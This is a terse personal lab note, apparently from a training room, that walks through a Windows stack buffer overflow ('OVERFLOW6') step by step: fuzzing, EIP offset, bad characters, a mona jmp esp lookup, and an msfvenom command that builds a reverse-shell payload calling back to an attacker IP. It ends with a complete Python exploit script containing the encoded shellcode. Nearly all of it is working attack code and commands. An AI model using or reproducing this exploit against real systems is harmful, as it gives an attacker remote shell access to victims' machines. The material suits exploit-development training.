## fuzzing

![[Pasted image 20210530145821.png]]

## offset

EIP: 35694234

offset: 1034

![[Pasted image 20210530150100.png]]

## bad chars

ESP: 0185FA30

![[Pasted image 20210530152406.png]]

bad chars: `\x00\x08\x2c\xad`

## jmp point

`!mona jmp -r esp -cpb "\x00\x08\x2c\xad"`

![[Pasted image 20210530152556.png]]

625011AF
little endian: `\xaf\x11\x50\x62`

## exploit

`msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x08\x2c\xad"`


![[Pasted image 20210530152756.png]]

```python
import socket

ip = "10.10.171.241"
port = 1337

prefix = "OVERFLOW6 "
offset = 1034
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"
padding = "\x90" * 16
payload = (
"\xda\xcd\xd9\x74\x24\xf4\xbb\xb3\xe7\x09\x1b\x5a\x29\xc9\xb1"
"\x52\x83\xea\xfc\x31\x5a\x13\x03\xe9\xf4\xeb\xee\xf1\x13\x69"
"\x10\x09\xe4\x0e\x98\xec\xd5\x0e\xfe\x65\x45\xbf\x74\x2b\x6a"
"\x34\xd8\xdf\xf9\x38\xf5\xd0\x4a\xf6\x23\xdf\x4b\xab\x10\x7e"
"\xc8\xb6\x44\xa0\xf1\x78\x99\xa1\x36\x64\x50\xf3\xef\xe2\xc7"
"\xe3\x84\xbf\xdb\x88\xd7\x2e\x5c\x6d\xaf\x51\x4d\x20\xbb\x0b"
"\x4d\xc3\x68\x20\xc4\xdb\x6d\x0d\x9e\x50\x45\xf9\x21\xb0\x97"
"\x02\x8d\xfd\x17\xf1\xcf\x3a\x9f\xea\xa5\x32\xe3\x97\xbd\x81"
"\x99\x43\x4b\x11\x39\x07\xeb\xfd\xbb\xc4\x6a\x76\xb7\xa1\xf9"
"\xd0\xd4\x34\x2d\x6b\xe0\xbd\xd0\xbb\x60\x85\xf6\x1f\x28\x5d"
"\x96\x06\x94\x30\xa7\x58\x77\xec\x0d\x13\x9a\xf9\x3f\x7e\xf3"
"\xce\x0d\x80\x03\x59\x05\xf3\x31\xc6\xbd\x9b\x79\x8f\x1b\x5c"
"\x7d\xba\xdc\xf2\x80\x45\x1d\xdb\x46\x11\x4d\x73\x6e\x1a\x06"
"\x83\x8f\xcf\x89\xd3\x3f\xa0\x69\x83\xff\x10\x02\xc9\x0f\x4e"
"\x32\xf2\xc5\xe7\xd9\x09\x8e\x0d\x0f\x15\x9e\x7a\x2d\x15\x3d"
"\x52\xb8\xf3\x2b\xb4\xec\xac\xc3\x2d\xb5\x26\x75\xb1\x63\x43"
"\xb5\x39\x80\xb4\x78\xca\xed\xa6\xed\x3a\xb8\x94\xb8\x45\x16"
"\xb0\x27\xd7\xfd\x40\x21\xc4\xa9\x17\x66\x3a\xa0\xfd\x9a\x65"
"\x1a\xe3\x66\xf3\x65\xa7\xbc\xc0\x68\x26\x30\x7c\x4f\x38\x8c"
"\x7d\xcb\x6c\x40\x28\x85\xda\x26\x82\x67\xb4\xf0\x79\x2e\x50"
"\x84\xb1\xf1\x26\x89\x9f\x87\xc6\x38\x76\xde\xf9\xf5\x1e\xd6"
"\x82\xeb\xbe\x19\x59\xa8\xdf\xfb\x4b\xc5\x77\xa2\x1e\x64\x1a"
"\x55\xf5\xab\x23\xd6\xff\x53\xd0\xc6\x8a\x56\x9c\x40\x67\x2b"
"\x8d\x24\x87\x98\xae\x6c"
)

postfix = ""

buffer = prefix + overflow + retn + padding + payload  + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```